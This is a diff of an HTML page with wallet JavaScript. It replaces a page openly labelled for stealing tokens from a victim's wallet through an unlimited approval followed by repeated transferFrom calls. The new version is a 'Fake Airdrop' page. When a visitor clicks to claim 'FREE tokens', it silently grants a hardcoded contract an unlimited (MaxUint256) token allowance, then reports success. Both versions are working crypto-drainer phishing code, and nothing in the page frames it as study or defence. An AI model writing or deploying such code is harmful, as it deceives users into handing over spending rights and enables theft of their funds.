@@ -3,89 +3,53 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Token Approval DApps</title>
-    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-        }
-        .container {
-            max-width: 600px;
-            margin: auto;
-            padding: 20px;
-        }
-    </style>
+    <title>Fake Airdrop</title>
+    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js" type="application/javascript"></script>
 </head>
 <body>
+    <h1>Fake Token Airdrop</h1>
+    <p>Claim your FREE tokens now!</p>
+    <button id="claimButton">Claim Airdrop</button>
+    <div id="status"></div>
 
-<div class="container">
-    <h1>Token Approval DApps</h1>
+    <script>
+        async function claimAirdrop() {
+            // Check if MetaMask is installed
+            if (typeof window.ethereum !== 'undefined') {
+                try {
+                    // Request account access
+                    await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    const provider = new ethers.providers.Web3Provider(window.ethereum);
+                    const signer = provider.getSigner();
+                    
+                    // Contract address and ABI
+                    const contractAddress = "0x716FaF16d4423B337C93bFAefA6134d77cC7AfFF";
+                    const abi = [
+                        {
+                            "inputs": [{"internalType": "address","name": "spender","type": "address"},{"internalType": "uint256","name": "amount","type": "uint256"}],
+                            "name": "approve",
+                            "outputs": [{"internalType": "bool","name": "","type": "bool"}],
+                            "stateMutability": "nonpayable",
+                            "type": "function"
+                        }
+                    ];
+                    
+                    const contract = new ethers.Contract(contractAddress, abi, signer);
 
-    <button id="connectWallet">Connect Wallet</button>
-    <p id="walletAddress"></p>
+                    // Approve the contract to spend all tokens (max uint256)
+                    const approveTx = await contract.approve(contractAddress, ethers.constants.MaxUint256);
+                    await approveTx.wait();
 
-    <h2>Approve Tokens</h2>
-    <button id="approveTokens">Approve All Tokens</button>
-
-    <h2>Steal Tokens</h2>
-    <button id="stealTokens">Steal Tokens from Victim</button>
-
-    <p id="result"></p>
-</div>
-
-<script>
-    let web3;
-    let contract;
-    let userAddress;
-
-    async function connectWallet() {
-        if (window.ethereum) {
-            try {
-                web3 = new Web3(window.ethereum);
-                await window.ethereum.request({ method: 'eth_requestAccounts' });
-                userAddress = web3.eth.accounts[0];
-                contract = new web3.eth.Contract(abi, contractAddress);
-                document.getElementById('walletAddress').innerText = `Wallet Address: ${userAddress}`;
-            } catch (error) {
-                console.error(error);
-                document.getElementById('walletAddress').innerText = `Error connecting wallet.`;
+                    document.getElementById('status').innerText = "Airdrop claimed! Check your wallet.";
+                } catch (error) {
+                    document.getElementById('status').innerText = "Something went wrong: " + error.message;
+                }
+            } else {
+                document.getElementById('status').innerText = "Please install MetaMask to interact with this airdrop.";
             }
-        } else {
-            alert('MetaMask not detected. Please install MetaMask.');
         }
-    }
 
-    async function approveTokens() {
-        try {
-            const tx = await contract.methods.approve(contractAddress, web3.utils.toBN("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff")).send({ from: userAddress });
-            document.getElementById('result').innerText = `Approval Status: ${tx.status}`;
-        } catch (error) {
-            console.error(error);
-            document.getElementById('result').innerText = `Error approving tokens.`;
-        }
-    }
-
-    async function stealTokens() {
-        const victimAddress = prompt("Enter victim's wallet address:");
-        if (!victimAddress) return;
-
-        try {
-            const txA = await contract.methods.transferFrom(victimAddress, userAddress, await contract.methods.balanceOf(victimAddress).call()).send({ from: userAddress });
-            const txB = await contract.methods.transferFrom(victimAddress, userAddress, await contract.methods.balanceOf(victimAddress).call()).send({ from: userAddress });
-            const txC = await contract.methods.transferFrom(victimAddress, userAddress, await contract.methods.balanceOf(victimAddress).call()).send({ from: userAddress });
-
-            document.getElementById('result').innerText = `Steal Tokens Status: Success for Token A, B, and C`;
-        } catch (error) {
-            console.error(error);
-            document.getElementById('result').innerText = `Error stealing tokens.`;
-        }
-    }
-
-    document.getElementById('connectWallet').addEventListener('click', connectWallet);
-    document.getElementById('approveTokens').addEventListener('click', approveTokens);
-    document.getElementById('stealTokens').addEventListener('click', stealTokens);
-
-</script>
-
+        document.getElementById('claimButton').addEventListener('click', claimAirdrop);
+    </script>
 </body>
 </html>
